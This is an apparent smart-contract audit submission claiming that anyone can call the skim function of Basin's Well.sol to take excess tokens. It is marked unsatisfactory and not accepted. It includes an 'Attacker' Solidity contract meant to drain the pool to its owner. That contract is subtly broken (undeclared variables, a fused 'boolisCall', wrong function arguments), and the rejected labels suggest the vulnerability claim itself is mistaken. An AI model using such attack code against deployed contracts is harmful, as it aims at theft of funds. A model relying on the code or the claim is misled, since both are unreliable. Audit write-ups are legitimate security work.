# #209: Anyone can call  Well.sol skim method and transfer excessive tokens to its address.
Labels: ['bug', '3 (High Risk)', 'unsatisfactory', 'edited-by-warden', 'duplicate-25']
Accepted: False

# Lines of code

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L603-L613


# Vulnerability details

## Impact
Excessive tokens balance of `Well.sol` more than  returned from `getReserves()`  can be transferred by anyone to his account.

## Proof of Concept
After getting hold token's instances from `Well.sol` contract `tokens()` we can check the balances of Contract of Each token and get reserves from `getReserves()` function of that contract for each token. Calling to `skim` function of contract can resulted with unwanted transfers of balances of contract .The difference of balance and reserve for each token can be transferred by any attacker to his account. No access control  check is implemented to prevent it. 

### Vulnerable Code : [/src/Well.sol#L603-L613](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L603-L613)

```solidity
File: /src/Well.sol
603: function skim(address recipient) external nonReentrant returns (uint256[] memory skimAmounts) {
        IERC20[] memory _tokens = tokens();
        uint256[] memory reserves = _getReserves(_tokens.length);
        skimAmounts = new uint256[](_tokens.length);
        for (uint256 i; i < _tokens.length; ++i) {
            skimAmounts[i] = _tokens[i].balanceOf(address(this)) - reserves[i];
            if (skimAmounts[i] > 0) {
                _tokens[i].safeTransfer(recipient, skimAmounts[i]);
            }
        }
    }
```
### [tokens() view Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L84C5-L86C6)

```solidity
File : /src/Well.sol
84: function tokens() public pure returns (IERC20[] memory ts) {
85:        ts = _getArgIERC20Array(LOC_VARIABLE, numberOfTokens());
86:    }
```


### [getReserves() view Function :](https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L615C5-L620C1)

```solidity
File : /src/Well.sol
615: function getReserves() external view returns (uint256[] memory reserves) {
        // Use the same error as `ReentrancyGuardUpgradeable` instead of using a custom error for consistency.
        require(!_reentrancyGuardEntered(), "ReentrancyGuard: reentrant call");
        reserves = _getReserves(numberOfTokens());
    }

```

### Attacker Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {IWell, Call} from "src/interfaces/IWell.sol";
import {IERC20} from "oz/token/ERC20/utils/SafeERC20.sol";
import {IWellFunction} from "src/interfaces/IWellFunction.sol";

contract Attacker {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _wellContract) public {
        IWell well = IWell(_wellContract);
        IERC20[] memory _tokens = well.tokens();
        uint256[] memory reserves = well.getReserves(_tokens.length); //@audit gas cache token.length
        skimAmounts = new uint256[](_tokens.length);
   boolisCall;
        for (uint256 i; i < _tokens.length; ++i) {
            skimAmounts[i] = _tokens[i].balanceOf(_wellContract) - reserves[i];
            //@audit gas cache simAmount[i]
            if (skimAmounts[i] > 0) {
              
               isCall=true;
            }
        } 
            if(isCall) well.skim(owner); 
    }

    function readyToAttack(
        address _wellContract
    ) public view returns (uint256, address) {
        IWell well = IWell(_wellContract);
        IERC20[] memory _tokens = well.tokens();
        uint256[] memory reserves = well.getReserves(_tokens.length);
        skimAmounts = new uint256[](_tokens.length);

        for (uint256 i; i < _tokens.length; ++i) {
            skimAmounts[i] = _tokens[i].balanceOf(_wellContract) - reserves[i];
            if (skimAmounts[i] > 0) {
                return (skimAmounts[i], _tokens[i].address);
            }
            //@audit if any token is available to withdraw then we will atack for all
        }
    }
}

```

You can see in the above contract how can attack happen.
Using this attacker we can first take all the list of tokens and reserves from Well.sol `tokens()` and `getResreves()` functions respectively.
Now we can run a for loop for all `\_tokens` array tokens to know Well contract has excessive tokens from more than reserves. Mostly calls and calculations like Well.sol `skim` function.
If excessive tokens found. Then call `skim` function to Well contract and give owner of this attacker as recipient. By this attacker can get all the excessive tokens, difference between `_tokens[i].balanceOf(_wellContract)` and `reserves[i]` into his account.

There is also a view function to check attack is efficient or not. By checking which token and how much amount is ready to withdraw for attacker.

## Tools Used
Manual Review

## Recommended Mitigation Steps

1. Use proper access control so that only genuine caller Or Owner can call this.
2. Make a recipient mapping containing genuine recipient addresses where protocol wants to send extra tokens not malicious address.
3. Then implement proper checks for msg.sender and recipient. Send money/tokens based on msg.sender not for everyone. Take extra care when sending money/tokens to any address.






## Assessed type

Access Control